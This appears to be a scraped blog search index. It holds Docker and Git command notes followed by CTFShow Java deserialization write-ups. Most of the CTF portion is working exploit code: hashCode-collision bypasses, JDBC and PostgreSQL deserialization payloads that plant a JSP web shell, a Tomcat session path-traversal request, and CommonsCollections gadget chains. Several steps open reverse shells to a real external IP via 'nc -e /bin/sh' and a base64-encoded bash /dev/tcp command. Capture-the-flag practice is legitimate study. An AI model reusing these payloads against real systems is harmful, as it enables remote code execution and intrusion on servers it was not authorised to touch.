3 ubuntu/mysql MySQL open source fast, stable, multi-thread… 58 rapidfort/mysql RapidFort optimized, hardened image for MySQL 25 rapidfort/mysql8-ib RapidFort optimized, hardened image for MySQ… 9 google/mysql MySQL server for Google Compute Engine 25 [OK] rapidfort/mysql-official RapidFort optimized, hardened image for MySQ… 9 elestio/mysql Mysql, verified and packaged by Elestio 0 hashicorp/mysql-portworx-demo 0 bitnamicharts/mysql 0 databack/mysql-backup Back up mysql databases to... anywhere! 105 linuxserver/mysql A Mysql container, brought to you by LinuxSe… 41 mirantis/mysql 0 docksal/mysql MySQL service images for Docksal - https://d… 0 linuxserver/mysql-workbench 54 vitess/mysqlctld vitess/mysqlctld 1 [OK] eclipse/mysql Mysql 5.7, curl, rsync 1 [OK] drupalci/mysql-5.5 https://www.drupal.org/project/drupalci 3 [OK] drupalci/mysql-5.7 https://www.drupal.org/project/drupalci 0 datajoint/mysql MySQL image pre-configured to work smoothly … 2 [OK] docker pull 镜像名[:tag] 下载镜像 f10wers13eicheng@MacBookPro [12时25分27秒] [/Library/Java/JavaVirtualMachines] -\u003e % docker pull mysql # 不写 tag 默认就是 latest Using default tag: latest latest: Pulling from library/mysql 72a69066d2fe: Pull complete #分层下载 docker images的核心 93619dbc5b36: Pull complete 99da31dd6142: Pull complete 626033c43d70: Pull complete 37d5d7efb64e: Pull complete ac563158d721: Pull complete d2ba16033dad: Pull complete 688ba7d5c01a: Pull complete 00e060b6d11d: Pull complete 1c04857f594f: Pull complete 4d7cfa90e6ea: Pull complete e0431212d27d: Pull complete Digest: sha256:e9027fe4d91c0153429607251656806cc784e914937271037f7738bd5b8e7709 # 签名信息 Status: Downloaded newer image for mysql:latest docker.io/library/mysql:latest #真实地址 # 等价于 docker pull mysql docker pull docker.io/library/mysql:latest docker rmi 镜像id 删除镜像 ","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:2:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" 容器命令docker pull centos 下载centos镜像 docker run [可选参数] image # 参数说明 --name=\"Name\" #容器名字 -d #后台方式运行 -it #是用交互方式运行，进入容器查看内容 -p #指定容器的端口 -p 8080:8080 -p ip:主机端口:容器端口 -p 主机端口:容器端口 -p 容器端口 -P #随机指定端口 # 启动并进入容器 f10wers13eicheng@MacBookPro [12时35分17秒] [/Library/Java/JavaVirtualMachines] -\u003e % docker run -it centos /bin/bash [root@a9def1b9102e /]# ls # 查看容器内的目录 bin dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var [root@a9def1b9102e /]# whoami root [root@a9def1b9102e /]# exit #从容器中退回主机 列出所有运行的容器 docker ps 命令 -a #列出当前正在运行的容器 + 带历史运行过的容器 -n=? #显示最近创建的容器 -q #显示容器id exit 直接容器停止并退出 Ctrl + P + Q 容器不停止但退出 删除容器 docker rm 容器id #删除指定容器 docker rm -f $(docker ps -aq) #删除所有容器 启动和停止容器的操作 docker start 容器id #启动容器 docker restart 容器id #重启容器 docker stop 容器id #停止容器 docker kill 容器id #停止当前运行的容器并删除 ","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:3:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" 常用的其他命令后台启动容器 # docker run -d 镜像名 f10wers13eicheng@MacBookPro [12时46分50秒] [/Library/Java/JavaVirtualMachines] -\u003e % docker run -d centos 8587f88f16bbc5fdb9dfb6de01c5173d9c25c23ed1f99d11b1d52575167cbefa f10wers13eicheng@MacBookPro [12时46分58秒] [/Library/Java/JavaVirtualMachines] -\u003e % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES # docker ps发现 centos停止了 # 常见的坑 docker容器使用后台运行，就必须要有一个前台进程 docker 发现没有应用，就会自动停止 # nginx，容器启动后，发现自己没有提供服务，就会立刻停止。 查看日志 docker logs # 查看日志信息 docker logs -tf 容器id # 显示日志 -tf # 显示日志 --tail # 显示日志条数 查看容器中进程信息 docker top 容器id 查看容器的元数据 docker inspect 容器id 进入当前正在运行的容器 # 通常容器都是使用后台方式运行的，需要进入容器，修改一些配置 # 命令 docker exec -it 容器id /bin/bash #进入容器后开启一个新的终端 docker attach 容器id # 进入容器正在执行的终端，不会启动一个新的进程 从容器内拷贝文件到主机上 docker cp 容器id:容器内路径 目的主机路径 ","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:4:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" 部署 nginx - Docker练习docker search nginx 搜索镜像 docker pull nginx 下载镜像 docker run -d --name nginx01 -p 3344:80 nginx 启动镜像 ","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:5:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" 部署 tomcat - Docker练习docker pull tomcat docker run -d --name tomcat01 -p 3345:8080 tomcat docker exec -it tomcat01 /bin/bash 进入容器 ","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:6:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" Es+Kibana - Docker练习 # --net 网络配置 $ docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e \"discovery.type=single-node\" elasticsearch:7.6.2 docker stats # 查看cpu状态 -e #环境配置修改 Docker 镜像如何得到镜像？ 从远程仓库下载 自己制作一个 Dockerfile ","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:7:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" 镜像加载原理UnionFS(联合文件系统) ","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:8:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" commit镜像 docker commit 提交容器称为一个新的副本 docker commit -m=\"提交的描述信息\" -a=\"作者\" 容器id 目标镜像名:[TAG] ","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:9:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" Git的必要配置git config -l 查看配置文件 git config --system --list 查看系统的git配置文件 git config --global --list 查看当前用户配置 设置用户名和邮箱 user.email=beichenghua@gmail.com user.name=nlrvana ","date":"2024-01-25","objectID":"/git%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:1:0","tags":["Git"],"title":"Git学习记录","uri":"/git%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["运维"],"content":" Git项目创建git init 初始化文件 git clone 克隆文件到本地 git add . 放至暂存区 git commit -m \"message\" 提交暂存区的内容到本地仓库 ","date":"2024-01-25","objectID":"/git%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:2:0","tags":["Git"],"title":"Git学习记录","uri":"/git%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["运维"],"content":" Git分支 # 列出所有本地分支 git branch # 列出所有远程分支 git branch -r # 新建一个分支，并切换到该分支 git checkout -b [branch] # 合并指定分支到当前分支 git merge [branch] # 删除分支 git branch -d [branch-name] # 删除远程分支 git push origin --delete [branch-name] git branch -dr [remote/branch] ","date":"2024-01-25","objectID":"/git%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:3:0","tags":["Git"],"title":"Git学习记录","uri":"/git%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["Java"],"content":" Web855 import java.io.*; public class User implements Serializable { private static final long serialVersionUID = 0x36d; private String username; private String password; public User(String username, String password) { this.username = username; this.password = password; } public String getUsername() { return username; } public void setUsername(String username) { this.username = username; } public String getPassword() { return password; } public void setPassword(String password) { this.password = password; } private static final String OBJECTNAME=\"ctfshow\"; private static final String SECRET=\"123456\"; private static String shellCode=\"chmod +x ./\"+OBJECTNAME+\" \u0026\u0026 ./\"+OBJECTNAME; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { int magic = in.readInt(); if(magic==2135247942){ byte var1 = in.readByte(); switch (var1){ case 1:{ int var2 = in.readInt(); if(var2==0x36d){ FileOutputStream fileOutputStream = new FileOutputStream(OBJECTNAME); fileOutputStream.write(new byte[]{0x7f,0x45,0x4c,0x46}); byte[] temp = new byte[1]; while((in.read(temp))!=-1){ fileOutputStream.write(temp); } fileOutputStream.close(); in.close(); } break; } case 2:{ ObjectInputStream.GetField gf = in.readFields(); String username = (String) gf.get(\"username\", null); String password = (String) gf.get(\"password\",null); username = username.replaceAll(\"[\\\\p{C}\\\\p{So}\\uFE00-\\uFE0F\\\\x{E0100}-\\\\x{E01EF}]+\", \"\") .replaceAll(\" {2,}\", \" \"); password = password.replaceAll(\"[\\\\p{C}\\\\p{So}\\uFE00-\\uFE0F\\\\x{E0100}-\\\\x{E01EF}]+\", \"\") .replaceAll(\" {2,}\", \" \"); User var3 = new User(username,password); User admin = new User(OBJECTNAME,SECRET); if(var3 instanceof User){ if(OBJECTNAME.equals(var3.getUsername())){ throw new RuntimeException(\"object unserialize error\"); } if(SECRET.equals(var3.getPassword())){ throw new RuntimeException(\"object unserialize error\"); } if(var3.equals(admin)){ Runtime.getRuntime().exec(shellCode); } }else{ throw new RuntimeException(\"object unserialize error\"); } break; } default:{ throw new RuntimeException(\"object unserialize error\"); } } } } @Override public boolean equals(Object o) { if (this == o) return true; if (!(o instanceof User)) return false; User user = (User) o; return this.hashCode() == user.hashCode(); } @Override public int hashCode() { return username.hashCode()+password.hashCode(); } } 来审计一下代码 User类继承了Serializable接口，说明可以被序列化 public class User implements Serializable 定义了三个静态变量无法被改变 private static final String OBJECTNAME=\"ctfshow\"; private static final String SECRET=\"123456\"; private static String shellCode=\"chmod +x ./\"+OBJECTNAME+\" \u0026\u0026 ./\"+OBJECTNAME; 并重写了equals()和hashCode()方法 @Override public boolean equals(Object o) { if (this == o) return true; if (!(o instanceof User)) return false; User user = (User) o; return this.hashCode() == user.hashCode(); } @Override public int hashCode() { return username.hashCode()+password.hashCode(); } 接下来最后看反序列化入口点readObject()方法 private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { int magic = in.readInt(); if(magic==2135247942){ byte var1 = in.readByte(); switch (var1){ case 1:{ int var2 = in.readInt(); if(var2==0x36d){ FileOutputStream fileOutputStream = new FileOutputStream(OBJECTNAME); fileOutputStream.write(new byte[]{0x7f,0x45,0x4c,0x46}); byte[] temp = new byte[1]; while((in.read(temp))!=-1){ fileOutputStream.write(temp); } fileOutputStream.close(); in.close(); } break; } case 2:{ ObjectInputStream.GetField gf = in.readFields(); String username = (String) gf.get(\"username\", null); String password = (String) gf.get(\"password\",null); username = username.replaceAll(\"[\\\\p{C}\\\\p{So}\\uFE00-\\uFE0F\\\\x{E0100}-\\\\x{E01EF}]+\", \"\") .replaceAll(\" {2,}\", \" \"); password = password.replaceAll(\"[\\\\p{C}\\\\p{So}\\uFE00-\\uFE0F\\\\x{E0100}-\\\\x{E01EF}]+\", \"\") .replaceAll(\" {2,}\", \" \"); User var3 = new User(username,password); User admin = new User(OBJECTNAME,SECRET); if(var3 instanceof User){ if(OBJECTNAME.equals(var3.getUsername())){ throw new RuntimeException(\"object unserialize error\"); } if(SECRET.equals(var3.getPassword())){ throw new RuntimeException(\"object unserialize error\"); } if(var3.equals(admin)){ Runtime.getRuntime().exec(shellCode); } }else{ throw new RuntimeException(\"object unserialize error\"); } break; } default:{ throw new RuntimeException(\"object unserialize error\"); } } } } 有两个点，第一个点会写入一个文件，并且开头是0x7f,0x45,0x4c,0x46，这是elf文件的开头 case 1:{ int var2 = in.readInt(); if(var2==0x36d){ FileOutputStream fileOutputStream = new FileOutputStream(OBJECTNAME); fileOutputStream.write(new byte[]{0x7f,0x45,0x4c,0x46}); byte[] temp = new byte[1]; while((in.read(temp))!=-1){ fileOutputStream.write(temp); } fileOutputStream.close(); in.close(); } break; } 第二个点，绕过if条件，会执行shellcode这个变量 case 2:{ ObjectInputStream.GetField gf = in.readFields(); String username = (String) gf.get(\"username\", null); String password = (String) gf.get(\"password\",null); username = username.replaceAll(\"[\\\\p{C}\\\\p{So}\\uFE00-\\uFE0F\\\\x{E0100}-\\\\x{E01EF}]+\", \"\") .replaceAll(\" {2,}\", \" \"); password = password.replaceAll(\"[\\\\p{C}\\\\p{So}\\uFE00-\\uFE0F\\\\x{E0100}-\\\\x{E01EF}]+\", \"\") .replaceAll(\" {2,}\", \" \"); User var3 = new User(username,password); User admin = new User(OBJECTNAME,SECRET); if(var3 instanceof User){ if(OBJECTNAME.equals(var3.getUsername())){ throw new RuntimeException(\"object unserialize error\"); } if(SECRET.equals(var3.getPassword())){ throw new RuntimeException(\"object unserialize error\"); } if(var3.equals(admin)){ Runtime.getRuntime().exec(shellCode); } }else{ throw new RuntimeException(\"object unserialize error\"); } break; } shellcode private static String shellCode=\"chmod +x ./\"+OBJECTNAME+\" \u0026\u0026 ./\"+OBJECTNAME; 会赋予ctfshow这个文件执行权限，并且执行 现在的思路就是写入一个elf文件，并且执行 构造poc 本地写一个c文件程序 #include\u003cstdlib.h\u003e int main() { system(\"nc ip port -e /bin/sh\"); return 0; } 编译一下gcc shellcode.c -o shellcode 接着再把前四个字节删掉 利用反序列化写入，在此之前，还有几个if条件需要绕过 if(var3 instanceof User){ if(OBJECTNAME.equals(var3.getUsername())){ throw new RuntimeException(\"object unserialize error\"); } if(SECRET.equals(var3.getPassword())){ throw new RuntimeException(\"object unserialize error\"); } if(var3.equals(admin)){ Runtime.getRuntime().exec(shellCode); 实例化传入的username和password不能是ctfshow和123456，但是hash比较的时候又相等。 这个时候需要用到Java里的hash碰撞 def hashcode(val): h=0 for i in range(len(val)): h=31 * h + ord(val[i]) return h t=\"ct\" #t=\"12\" for k in range(1,128): for l in range(1,128): if t!=(chr(k)+chr(l)): if(hashcode(t)==hashcode(chr(k)+chr(l))): print(t,chr(k)+chr(l)) 得到 ct,dU 12,0Q 构造完整的Poc package com.ctfshow; import com.ctfshow.entity.User; import java.io.*; import java.util.Base64; public class Vuln { public static void main(String[] args) throws Exception{ User user = new User(\"dUfshow\",\"0Qahua\"); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(user); String payload = Base64.getEncoder().encodeToString(baos.toByteArray()); System.out.println(payload); } } 重写的writeObject private void writeObject(ObjectOutputStream out) throws Exception{ out.writeInt(2135247942); out.writeByte(1); //执行RCE的时候，将这里改成2下面注释掉即可 /////////////////////////// out.writeInt(0x36d); File filename = new File(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/bash\"); BufferedInputStream in = new BufferedInputStream(new FileInputStream(filename)); byte[] temp = new byte[1024]; int size = 0; while((size = in.read(temp)) != -1){ out.write(temp,0,size); } in.close(); ///////////////////////// out.defaultWriteObject(); } ","date":"2024-01-22","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/:1:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(2)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/"},{"categories":["Java"],"content":" Web856考察jdbc反序列化 package com.ctfshow.entity; import java.io.IOException; import java.io.ObjectInputStream; import java.io.Serializable; import java.sql.DriverManager; import java.sql.SQLException; import java.util.Objects; public class Connection implements Serializable { private static final long serialVersionUID = 2807147458202078901L; private String driver; private String schema; private String host; private int port; private User user; private String database; public String getDriver() { return driver; } public void setDriver(String driver) { this.driver = driver; } public String getSchema() { return schema; } public void setSchema(String schema) { this.schema = schema; } public void setPort(int port) { this.port = port; } public String getHost() { return host; } public void setHost(String host) { this.host = host; } public User getUser() { return user; } public void setUser(User user) { this.user = user; } public String getDatabase() { return database; } public void setDatabase(String database) { this.database = database; } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException, SQLException { Class.forName(\"com.mysql.jdbc.Driver\"); ObjectInputStream.GetField gf = in.readFields(); String host = (String) gf.get(\"host\", \"127.0.0.1\"); int port = (int) gf.get(\"port\",3306); User user = (User) gf.get(\"user\",new User(\"root\",\"root\")); String database = (String) gf.get(\"database\", \"ctfshow\"); String schema = (String) gf.get(\"schema\", \"jdbc:mysql\"); DriverManager.getConnection( schema+\"://\"+host+\":\"+port+\"/?\"+database+\"\u0026user=\"+user.getUsername()); } @Override public boolean equals(Object o) { if (this == o) return true; if (!(o instanceof Connection)) return false; Connection that = (Connection) o; return Objects.equals(host, that.host) \u0026\u0026 Objects.equals(port, that.port) \u0026\u0026 Objects.equals(user, that.user) \u0026\u0026 Objects.equals(database, that.database); } @Override public int hashCode() { return Objects.hash(host, port, user, database); } }``` 漏洞出现在这里 ```java private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException, SQLException { Class.forName(\"com.mysql.jdbc.Driver\"); ObjectInputStream.GetField gf = in.readFields(); String host = (String) gf.get(\"host\", \"127.0.0.1\"); int port = (int) gf.get(\"port\",3306); User user = (User) gf.get(\"user\",new User(\"root\",\"root\")); String database = (String) gf.get(\"database\", \"ctfshow\"); String schema = (String) gf.get(\"schema\", \"jdbc:mysql\"); DriverManager.getConnection( schema+\"://\"+host+\":\"+port+\"/?\"+database+\"\u0026user=\"+user.getUsername()); } 直接进行 JDBC 反序列化 利用工具 https://github.com/fnmsd/MySQL_Fake_Server package com.ctfshow; import com.ctfshow.entity.Connection; import com.ctfshow.entity.User; import java.io.*; import java.lang.reflect.Field; import java.util.Base64; public class Vuln{ public static void main(String[] args) throws Exception{ Connection connection = new Connection(); setFieldValue(connection,\"host\",\"124.220.215.8\"); //vps 地址 setFieldValue(connection,\"port\",3300); //vps端口 setFieldValue(connection,\"user\",new User(\"huahua\",\"1\")); setFieldValue(connection,\"schema\",\"jdbc:mysql\"); setFieldValue(connection,\"database\",\"detectCustomCollations=true\u0026autoDeserialize=true\"); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream ois = new ObjectOutputStream(baos); ois.writeObject(connection); String payload = Base64.getEncoder().encodeToString(baos.toByteArray()); System.out.println(payload); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } ","date":"2024-01-22","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/:2:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(2)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/"},{"categories":["Java"],"content":" Referencehttps://tttang.com/archive/1877/#toc_2serverstatusdiffinterceptor https://xz.aliyun.com/t/8159 ","date":"2024-01-22","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/:2:1","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(2)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/"},{"categories":["Java"],"content":" Web857 javax.servlet-api 4.0.1 mysql-connector-java 5.1.39 postgresql 42.3.1 其中postgresql 42.3.1存在漏洞 https://forum.butian.net/share/1339 构造Poc package com.ctfshow; import com.ctfshow.entity.Connection; import com.ctfshow.entity.User; import java.io.*; import java.lang.reflect.Field; import java.util.Base64; public class Vuln{ public static void main(String[] args) throws Exception{ Connection connection = new Connection(); setFieldValue(connection,\"driver\",\"org.postgresql.Driver\"); setFieldValue(connection,\"host\",\"124.220.215.8\"); //vps 地址 setFieldValue(connection,\"port\",3300); //vps端口 setFieldValue(connection,\"user\",new User(\"huahua\",\"1\")); setFieldValue(connection,\"schema\",\"jdbc:postgresql\"); setFieldValue(connection,\"database\",\"loggerLevel=DEBUG\u0026loggerFile=../webapps/ROOT/hack.jsp\u0026\u003c%Runtime.getRuntime().exec(request.getParameter(\\\"huahua\\\"));%\u003e\"); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream ois = new ObjectOutputStream(baos); ois.writeObject(connection); String payload = Base64.getEncoder().encodeToString(baos.toByteArray()); System.out.println(payload); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 写入后，访问/hack.jsp 传入huahua=nc 124.220.215.8 1234 -e /bin/sh ","date":"2024-01-22","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/:3:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(2)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/"},{"categories":["Java"],"content":" Web858tomcat的session反序列化 https://www.freebuf.com/articles/web/242782.html User类中存在readObject的点，并且存在RCE package com.ctfshow.entity; import java.io.IOException; import java.io.ObjectInputStream; import java.io.Serializable; public class User implements Serializable { private static final long serialVersionUID = -3254536114659397781L; private String username; private String password; public String getUsername() { return username; } public void setUsername(String username) { this.username = username; } public String getPassword() { return password; } public void setPassword(String password) { this.password = password; } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { in.defaultReadObject(); Runtime.getRuntime().exec(this.username); } } 根据上面的复现文章，尝试打一下 构造Poc package com.ctfshow; import com.ctfshow.entity.User; import java.io.FileNotFoundException; import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; import java.lang.reflect.Field; public class Vuln1 { public static void main(String[] args) throws Exception { User user = new User(); Field username = user.getClass().getDeclaredField(\"username\"); username.setAccessible(true); username.set(user,\"cp /flag /usr/local/tomcat/webapps/ROOT/flag.txt\"); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"test.session\")); oos.writeObject(user); } } 上传文件后，得到目录 /usr/local/tomcat/webapps/ROOT/WEB-INF/upload/huahua 利用curl请求，再触发一下 curl 'http://fdff0a06-5233-4da3-94ab-f6b39075f072.challenge.ctf.show/' -H \"Cookie: JSESSIONID=../../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/upload/test\" ","date":"2024-01-22","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/:4:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(2)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/"},{"categories":["Java"],"content":" Web846 打开首页，告诉我们是dns查询，所以直接用URLDNS这条链子 package org.example; import java.io.*; import java.lang.reflect.Field; import java.net.URL; import java.util.Base64; import java.util.HashMap; public class URLDNS { public static void main(String[] args) throws Exception { HashMap h=new HashMap(); URL url=new URL(\"http://7c4597d6-3233-40c6-a484-176b02c0ecff.challenge.ctf.show/\"); Class cls=Class.forName(\"java.net.URL\"); Field f = cls.getDeclaredField(\"hashCode\"); f.setAccessible(true); f.set(url,1); h.put(url,1); f.set(url,-1); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(h); String payload = Base64.getEncoder().encodeToString(b.toByteArray()); System.out.println(payload); } } ","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:1:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" Web847https://x.hacking8.com/java-runtime.html Java7 commons-collections 3.1 用CC1的链， package org.example.CommonsCollections; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class CommonsCollections1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNC4yMjAuMjE1LjgvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); map.put(\"value\", \"value\"); Map\u003cObject, Object\u003e transformedMap = TransformedMap.decorate(map, null, chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(o); String payload = Base64.getEncoder().encodeToString(b.toByteArray()); System.out.println(payload); } } ","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:2:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" Web848Java7 commons-collections 3.1 禁用了TransformedMap类 换CC1的另一条用LazyMap package org.example.CommonsCollections; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class CommonsCollections1 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNC4yMjAuMjE1LjgvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e lazymap = LazyMap.decorate(map,chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap); Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(o); String payload = Base64.getEncoder().encodeToString(b.toByteArray()); System.out.println(payload); } } 